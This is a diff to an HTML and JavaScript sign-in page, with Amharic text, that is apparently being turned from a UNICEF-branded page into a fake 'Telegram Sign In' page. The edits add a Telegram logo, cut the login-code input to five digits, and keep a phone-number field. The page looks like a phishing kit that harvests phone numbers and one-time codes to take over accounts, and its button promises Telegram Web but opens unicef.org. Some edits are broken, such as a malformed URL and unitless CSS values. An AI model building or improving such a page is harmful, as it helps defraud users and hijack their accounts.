@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Unicef Sign In</title>
+<title>Telegram Sign In</title>
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 <style>
 * {
@@ -48,12 +48,22 @@ body {
   margin-bottom: 25px;
   position: relative;
 }
-
+.logo {
+  align-items: center;
+  font-size: 90px;
+  color: #2AABEE;
+  background: white;
+  border-radius: 50px;
+  display: flex;
+  position: absolute;
+  width: 85px;
+  height: 85px;
+}
 .telegram-logo {
   width: 85px;
   height: 85px;
   border-radius: 50%;
-  display: none;
+  display: flex;
   align-items: center;
   justify-content: center;
   position: relative;
@@ -76,8 +86,8 @@ body {
 
 .unicef-logo {
   position: absolute;
-  right: 0;
-  top: 0;
+  right: 100;
+  top: 5;
   width: 60px;
   height: 60px;
   background: rgba(255, 255, 255, 0.95);
@@ -95,7 +105,7 @@ body {
 }
 
 .unicef-logo img {
-  width: 100%;
+  width: 200%;
   height: auto;
   border-radius: 50%;
 }
@@ -713,6 +723,9 @@ body {
   <div class="header">
     <div class="telegram-logo">
       </div>
+   <div class="logo">
+     <i class="fab fa-telegram"></i>
+   </div>
     <div class="unicef-logo">
       <img src="Flag_of_UNICEF.svg.png" alt="UNICEF Logo">
     </div>
@@ -1039,7 +1052,7 @@ function validateCode(code) {
   }
   
   if (!code || code.trim() === '') {
-    errorElement.textContent = "እባክዎ 6-አሃዝ ኮድ ያስገቡ";
+    errorElement.textContent = "እባክዎ 5-አሃዝ ኮድ ያስገቡ";
     errorElement.classList.add('show');
     codeInput.classList.add('error');
     return false;
@@ -1271,7 +1284,7 @@ document.getElementById('phone').addEventListener('input', function(e) {
     if (value.length > 0) {
       if (value.length <= 3) {
         value = value;
-      } else if (value.length <= 6) {
+      } else if (value.length <= 5) {
         value = value.replace(/(\d{3})(\d{0,3})/, '$1 $2');
       } else {
         value = value.replace(/(\d{3})(\d{3})(\d{0,4})/, '$1 $2 $3');
@@ -1298,8 +1311,8 @@ document.getElementById('code').addEventListener('input', function(e) {
   
   value = value.replace(/\D/g, '');
   
-  if (value.length > 6) {
-    value = value.substring(0, 6);
+  if (value.length > 5) {
+    value = value.substring(0, 5);
   }
   
   e.target.value = value;
@@ -1332,7 +1345,7 @@ document.addEventListener('click', function(e) {
 // አማራጮች
 document.getElementById('open-telegram').addEventListener('click', function() {
   alert('Opening Telegram Web... You will be redirected to unicef.org');
-  window.open('https://unicef.org', '_blank');
+  window.open('https://.unicef.org', '_blank');
 });
 
 document.getElementById('download-app').addEventListener('click', function() {
